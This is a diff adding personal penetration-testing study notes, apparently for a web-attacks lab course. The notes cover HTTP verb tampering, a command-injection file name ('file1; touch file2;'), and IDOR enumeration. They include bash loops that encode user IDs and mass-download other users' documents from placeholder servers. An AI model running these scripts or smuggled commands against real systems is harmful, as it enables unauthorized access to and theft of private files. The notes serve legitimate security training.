@@ -472,3 +472,59 @@ git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
   identify which pages are restricted by this authentication
    curl -i -X OPTIONS http://SERVER_IP:PORT/
    change the request HTTP verb which restricted 
+-------------
+ try to create a new file name with special characters in its name (e.g. test;)
+ after confirm changing request will bypass filter 
+ -> use the following file name in our attack (file1; touch file2;)
+ =-===============
+ IDOR identify
+ Whenever we receive a specific file or resource, we should study the HTTP requests to look for URL parameters or APIs with an object reference
+ AJAX Calls
+ identify unused parameters or APIs in the front-end code in the form of JavaScript AJAX calls. Some web applications developed in JavaScript frameworks may insecurely place all function calls on the front-end and use the appropriate ones based on the user role.
+ function changeUserPassword() {
+    $.ajax({
+        url:"change_password.php",
+        type: "post",
+        dataType: "json",
+        data: {uid: user.uid, password: user.password, is_admin: is_admin},
+        success:function(result){
+may not use simple sequential numbers as object references but may encode the reference or hash it
+$.ajax({
+    url:"download.php",
+    type: "post",
+    dataType: "json",
+    data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
+    success:function(result){
+curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep "<li class='pure-tree_link'>"
+curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
+
+#!/bin/bash
+
+url="http://SERVER_IP:PORT"
+
+for i in {1..10}; do
+        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
+                wget -q $url/$link
+        done
+done
+-----------------
+echo -n 1 | base64 -w 0 | md5sum
+for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
+
+#!/bin/bash
+
+for i in {1..10}; do
+    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
+        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
+    done
+done
+
+bash ./exploit.sh
+ls -1q 
+----------------
+for i in {1..20}; do
+    for hash in $(echo -n $i | base64 -w 0); do
+        curl -sOJ "http://STMIP:STMPO/download.php?contract=$hash"
+    done
+done
+----------------------
